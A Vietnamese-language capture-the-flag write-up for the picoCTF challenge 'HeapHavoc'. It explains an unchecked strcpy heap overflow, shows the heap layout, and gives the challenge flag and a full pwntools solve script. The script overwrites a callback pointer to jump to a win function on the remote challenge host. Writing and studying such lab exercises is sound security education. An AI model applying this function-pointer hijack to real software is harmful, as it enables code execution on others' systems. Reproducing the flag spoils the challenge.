# HeapHavoc
>FLAG: picoCTF{h34p_0v3rfl0w_7bb56fe9}

Write-up was written by huhu

### Overview:

- Checksec:

<img width="1280" height="395" alt="image" src="https://github.com/user-attachments/assets/6953186d-e65d-40f6-a0a7-6a5a3971ad66" />

- Ta có 1 cái struct:
```c
struct internet {
    int priority;     //4 byte
    char *name;       //4 byte
    void (*callback)();  //4 byte
};
```
- Từ đó, ta có thể biết được layout của heap này.

### Bug

```c
i1 = malloc(sizeof(struct internet));
i1->priority = 1;
i1->name = malloc(8);
i1->callback = NULL;

i2 = malloc(sizeof(struct internet));
i2->priority = 2;
i2->name = malloc(8);
i2->callback = NULL;

strcpy(i1->name, argv[1]);  
strcpy(i2->name, argv[2]); 

if (i1->callback) i1->callback();
if (i2->callback) i2->callback();
```

- Bug nằm ở phần strcpy của i1->name, ta thấy nó không check length của các args, nên khi mình fuzzing tới A*21 thì chương trình bị crash:

<img width="1264" height="798" alt="image" src="https://github.com/user-attachments/assets/c8f2cba3-0979-4abb-97bb-a1de0419b1c3" />


- Layout của chương trình là:

```
[i1.priority][i1.name][i1.callback]
[i1->name buffer]
[i2.priority][i2.name][i2.callback]
[i2->name buffer]
```

- Bởi vì src code là:

```c
i1 = malloc(sizeof(struct internet));   //i1 struct
i1->name = malloc(8);                   //name buffer

i2 = malloc(sizeof(struct internet));   // i2 struct
i2->name = malloc(8);                   // name buffer
```

=> ghi malloc(8) byte tức là 0x10 byte để lấp hết buffer và ghi tràn sang i2 struct, từ đó, thay đổi hàm callback để chương trình gọi win.
 
- Tức là:

```python
win = 0x080492b6
trash = 0x0804c040

payload = b"A"*20 + p32(trash) + p32(win)
```

- Biến *name của i2 struct yêu cầu 1 địa chỉ writeable nên mình dùng 1 địa chỉ bất kỳ ở .bss rồi ghi đè địa chỉ hàm win vào call back.

<img width="1281" height="791" alt="image" src="https://github.com/user-attachments/assets/df11d41f-ea62-4936-9e82-d36fd6385b02" />

> Sigsegv vì địa chỉ của edx không writeable(đây là 1 địa chỉ tại cs)

### Solve code:

```python
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = "debug"

HOST = "foggy-cliff.picoctf.net"
PORT = 57525

win = 0x080492b6
trash = 0x0804c040

payload = b"A"*20 + p32(trash) + p32(win)

def start():
    if args.GDB:
        return gdb.debug([elf.path, payload, b"A"], gdbscript="")
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([elf.path, payload, b"A"])

io = start()

if args.REMOTE:
    io.recvline()
    io.sendline(payload + b" " + b"HUHU")

io.interactive()

```
